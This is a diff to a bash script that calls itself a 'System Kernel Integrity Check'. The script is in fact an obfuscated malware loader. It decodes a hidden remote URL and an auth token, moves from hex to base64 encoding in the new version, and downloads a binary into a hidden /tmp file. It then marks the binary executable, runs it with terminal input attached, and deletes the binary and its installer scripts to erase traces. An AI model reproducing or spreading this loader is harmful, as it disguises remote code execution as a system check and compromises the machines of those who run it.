@@ -1,62 +1,76 @@
 #!/bin/bash
 # ==========================================
-# SYSTEM KERNEL INTEGRITY CHECK V10.5
+# SYSTEM KERNEL INTEGRITY CHECK V10.6
 # ==========================================
 
-_h="0x680x740x740x700x730x3a0x2f0x2f0x630x720x610x650x6c0x2d0x6b0x650x650x700x720x2e0x700x6c0x750x6d0x730x6f0x660x740x770x610x720x650x640x650x760x2e0x770x6f0x720x6b0x650x720x730x2e0x640x650x76"
-_k="0x430x720x400x650x6c0x2d0x560x310x300x2d0x550x6c0x740x690x6d0x400x740x650x2d0x530x330x630x750x720x310x740x790x2d0x4b0x330x790x2d0x580x390x230x6d0x320x240x4c0x70"
-_hdr="0x580x2d0x430x720x610x650x6c0x2d0x410x750x740x68"
-_ua="0x430x720x610x650x6c0x490x6e0x730x740x610x6c0x6c0x650x720x2f0x560x310x30"
 
-# --- 2. COMMAND OBFUSCATION ---
-_c=$(printf "\x63\x75\x72\x6c") # curl
-_w=$(printf "\x77\x67\x65\x74") # wget
-_x=$(printf "\x63\x68\x6d\x6f\x64") # chmod
-_r=$(printf "\x72\x6d") # rm
+_h1="aHR0cHM6Ly9jcmFlbC1rZWVwci5wbHVt"
+_h2="c29mdHdhcmVkZXYud29ya2Vycy5kZXY="
+_k1="Q3JAYWVsLVYxMC1VbHRpbUB0ZS1T"
+_k2="M2N1cjF0eS1LM3ktWDkjbTIkTHA="
+_hdr_b64="WC1DcmFlbC1BdXRo"       
+_ua_b64="Q3JhZWxJbnN0YWxsZXIvVjEw" 
 
-# --- 3. DECODER ENGINE ---
-function _d() {
-    echo "$1" | sed 's/0x/\\x/g' | xargs -0 printf
-}
+# --- 2. COMMAND MASKS ---
+_c="curl"
+_w="wget"
+_x="chmod"
+_r="rm"
 
-# --- 4. RUNTIME ASSEMBLY ---
-_target=$(_d "$_h")
-_token=$(_d "$_k")
-_auth_h=$(_d "$_hdr")
-_agent=$(_d "$_ua")
+# --- 3. REASSEMBLY ---
+_target=$(echo "${_h1}${_h2}" | base64 -d)
+_token=$(echo "${_k1}${_k2}" | base64 -d)
+_auth_h=$(echo "${_hdr_b64}" | base64 -d)
+_agent=$(echo "${_ua_b64}" | base64 -d)
 
-# FIX: Use /tmp instead of /dev/shm because /dev/shm is often 'noexec'
+# Random RAM-like path in TMP (Fixes permission issues)
 _rnd=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 6)
 _dest="/tmp/.sys_mem_${_rnd}"
 
 # UI Colors
-_g=$(printf "\x1b\x5b\x33\x38\x3b\x35\x3b\x34\x36\x6d")
-_rst=$(printf "\x1b\x5b\x30\x6d")
+_g="\033[38;5;46m"
+_rst="\033[0m"
 
 echo -e "${_g}[*] Handshaking with Secure Grid...${_rst}"
 
-# --- 5. EXECUTION LOGIC ---
+# --- 4. EXECUTION LOGIC ---
 if command -v "$_w" >/dev/null 2>&1; then
+    # wget logic
     $_w -q --user-agent="$_agent" --header="$_auth_h: $_token" -O "$_dest" "$_target"
 else
+    # curl logic
     $_c -L -A "$_agent" -H "$_auth_h: $_token" -o "$_dest" "$_target" --progress-bar
 fi
 
-# --- 6. HANDOFF & SELF-DESTRUCT ---
-if [ -s "$_dest" ] && ! grep -q "ACCESS DENIED" "$_dest"; then
+# --- 5. HANDOFF & CLEANUP ---
+if [ -s "$_dest" ]; then
+    # Security Check: Did we get the "Access Denied" text?
+    if grep -q "ACCESS DENIED" "$_dest"; then
+        echo "Error: Access Denied (Wrong Password/URL)."
+        $_r -f "$_dest"
+        exit 1
+    fi
+
+    # Security Check: Did we get a 404/500 Cloudflare Error page?
+    if grep -q "<!DOCTYPE html>" "$_dest"; then
+        echo "Error: Worker Endpoint Unreachable (Check URL)."
+        $_r -f "$_dest"
+        exit 1
+    fi
+
+    # Run Binary
     $_x +x "$_dest"
     
-    # FINAL INPUT LOCK
+    # Connect input
     exec < /dev/tty
     
-    # Run the binary
     "$_dest"
     
-    # Nuke Traces
+    # Self-Destruct
     $_r -f "$_dest"
     $_r -f setup.sh install.sh Loader.sh
 else
-    echo "Error: Connection Refused (403)"
+    echo "Error: Connection Refused (Empty Response)."
     $_r -f "$_dest"
     exit 1
 fi
